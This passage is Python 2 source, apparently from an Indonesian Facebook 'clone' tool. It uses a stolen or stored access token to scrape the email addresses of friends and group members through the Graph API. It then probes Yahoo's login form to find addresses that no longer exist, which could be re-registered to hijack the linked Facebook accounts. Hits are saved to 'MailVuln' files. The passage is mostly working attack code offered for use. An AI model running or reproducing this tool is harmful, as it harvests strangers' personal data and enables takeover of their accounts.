            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write('Nama: ' + nama + 'ID :' + id + 'Email: ' + mail + '\n')
                    print '\x1b[1;96m[\x1b[1;92mVULN\xe2\x9c\x93\x1b[1;96m] \x1b[1;92m' + mail + ' \x1b[1;96m=>\x1b[1;97m' + nama
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile tersimpan \x1b[1;91m:\x1b[1;97m out/TemanMailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


def clone_dari_member_group():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

        os.system('clear')
        print logo
        mpsh = []
        jml = 0
        print 42 * '\x1b[1;96m='
        id = raw_input('\x1b[1;96m[+] \x1b[1;93mMasukan ID group \x1b[1;91m:\x1b[1;97m ')
        try:
            r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
            asw = json.loads(r.text)
            print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;93mNama group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        except KeyError:
            print '\x1b[1;96m[!] \x1b[1;91mGroup tidak ditemukan'
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()

    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mMengambil email \x1b[1;97m...')
    teman = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&limit=999999999&access_token=' + toket)
    kimak = json.loads(teman.text)
    save = open('out/GrupMailVuln.txt', 'w')
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    print 42 * '\x1b[1;96m='
    for w in kimak['data']:
        jml += 1
        mpsh.append(jml)
        id = w['id']
        nama = w['name']
        links = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
        z = json.loads(links.text)
        try:
            mail = z['email']
            yahoo = re.compile('@.*')
            otw = yahoo.search(mail).group()
            if 'yahoo.com' in otw:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = mail
                klik = br.submit().read()
                jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    pek = jok.search(klik).group()
                except:
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in pek:
                    save.write('Nama: ' + nama + 'ID :' + id + 'Email: ' + mail + '\n')
                    print '\x1b[1;96m[\x1b[1;97mVULN\xe2\x9c\x93\x1b[1;96m] \x1b[1;92m' + mail + ' \x1b[1;96m=>\x1b[1;97m' + nama
                    berhasil.append(mail)
        except KeyError:
            pass

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile tersimpan \x1b[1;91m:\x1b[1;97m out/GrupMailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


def clone_dari_file():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.mkdir('out')
        except OSError:
            pass

        os.system('clear')
        print logo
        print 42 * '\x1b[1;96m='
        files = raw_input('\x1b[1;96m[+] \x1b[1;93mNama File \x1b[1;91m: \x1b[1;97m')
        try:
            total = open(files, 'r')
            mail = total.readlines()
        except IOError:
            print '\x1b[1;96m[!] \x1b[1;91mFile tidak ditemukan'
            raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
            menu()

    mpsh = []
    jml = 0
    jalan('\x1b[1;96m[\xe2\x9c\xba] \x1b[1;93mStart \x1b[1;97m...')
    print '\x1b[1;96m[!] \x1b[1;93mStop CTRL+z'
    save = open('out/FileMailVuln.txt', 'w')
    print 42 * '\x1b[1;96m='
    mail = open(files, 'r').readlines()
    for pw in mail:
        mail = pw.replace('\n', '')
        jml += 1
        mpsh.append(jml)
        yahoo = re.compile('@.*')
        otw = yahoo.search(mail).group()
        if 'yahoo.com' in otw:
            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
            br._factory.is_html = True
            br.select_form(nr=0)
            br['username'] = mail
            klik = br.submit().read()
            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
            try:
                pek = jok.search(klik).group()
            except:
                continue

            if '"messages.ERROR_INVALID_USERNAME">' in pek:
                save.write(mail + '\n')
                print '\x1b[1;96m[\x1b[1;92mVULN\xe2\x9c\x93\x1b[1;96m] \x1b[1;92m' + mail
                berhasil.append(mail)

    print 42 * '\x1b[1;96m='
    print '\x1b[1;96m[\x1b[1;97m\xe2\x9c\x93\x1b[1;96m] \x1b[1;92mSelesai \x1b[1;97m....'
    print '\x1b[1;96m[+] \x1b[1;92mTotal \x1b[1;91m: \x1b[1;97m' + str(len(berhasil))
    print '\x1b[1;96m[+] \x1b[1;92mFile Tersimpan \x1b[1;91m:\x1b[1;97m out/FileMailVuln.txt'
    save.close()
    raw_input('\n\x1b[1;96m[\x1b[1;97mKembali\x1b[1;96m]')
    menu()


if __name__ == '__main__':
    login()
